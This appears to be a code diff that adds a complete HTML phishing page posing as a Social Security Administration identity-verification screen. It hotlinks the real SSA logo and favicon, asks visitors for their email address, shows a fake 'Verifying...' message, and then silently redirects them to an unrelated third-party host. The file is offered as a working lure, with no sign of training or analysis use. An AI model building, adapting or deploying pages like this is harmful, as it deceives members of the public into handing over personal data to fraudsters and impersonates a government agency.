@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Social Security Administration | Verify</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link rel="icon" href="https://www.ssa.gov/themes/custom/ssa_core/favicon.ico">
+
+<style>
+body{
+font-family:Arial,sans-serif;
+background:#f1f4f6;
+margin:0;
+}
+
+header{
+background:#002d72;
+padding:16px;
+text-align:center;
+color:#fff;
+}
+
+header img{
+height:50px;
+}
+
+.form-container{
+background:#fff;
+max-width:400px;
+margin:60px auto;
+padding:30px;
+border-radius:8px;
+box-shadow:0 0 10px rgba(0,0,0,0.1);
+}
+
+h2{
+text-align:center;
+color:#002d72;
+}
+
+p{
+text-align:center;
+}
+
+label{
+display:block;
+margin-top:20px;
+font-weight:bold;
+}
+
+input{
+width:100%;
+padding:12px;
+margin-top:8px;
+border:1px solid #ccc;
+border-radius:4px;
+font-size:16px;
+}
+
+button{
+margin-top:20px;
+width:100%;
+background:#002d72;
+color:#fff;
+font-size:16px;
+padding:12px;
+border:none;
+border-radius:4px;
+cursor:pointer;
+}
+
+.footer{
+text-align:center;
+font-size:12px;
+color:#888;
+margin-top:40px;
+}
+</style>
+
+<script>
+
+function validateForm(){
+
+let email=document.getElementById("email").value
+let pattern=/^[^\s@]+@[^\s@]+\.[^\s@]+$/
+
+if(!pattern.test(email)){
+alert("Email address is not correct, please try again!")
+return false
+}
+
+document.getElementById("formBox").innerHTML=
+"<h2>Verifying...</h2><p>Please wait while we verify your email address.</p>"
+
+setTimeout(function(){
+window.location.href="https://priva26.privatednsorg.com/~navintelcr/ju/sns/"
+},2000)
+
+return false
+}
+
+</script>
+</head>
+
+<body>
+
+<header>
+<img src="https://www.ssa.gov/themes/custom/ssa_core/logo.svg">
+<h1>Social Security Administration</h1>
+</header>
+
+<div class="form-container" id="formBox">
+
+<h2>Verify Your Identity</h2>
+
+<p>
+To protect your information, please verify your email address before continuing.
+</p>
+
+<form onsubmit="return validateForm()">
+
+<label>Email Address</label>
+
+<input
+type="email"
+id="email"
+placeholder="example@example.com"
+required
+>
+
+<button type="submit">
+Continue
+</button>
+
+</form>
+
+</div>
+
+<div class="footer">
+© 2026 Social Security Administration
+</div>
+
+</body>
+</html>
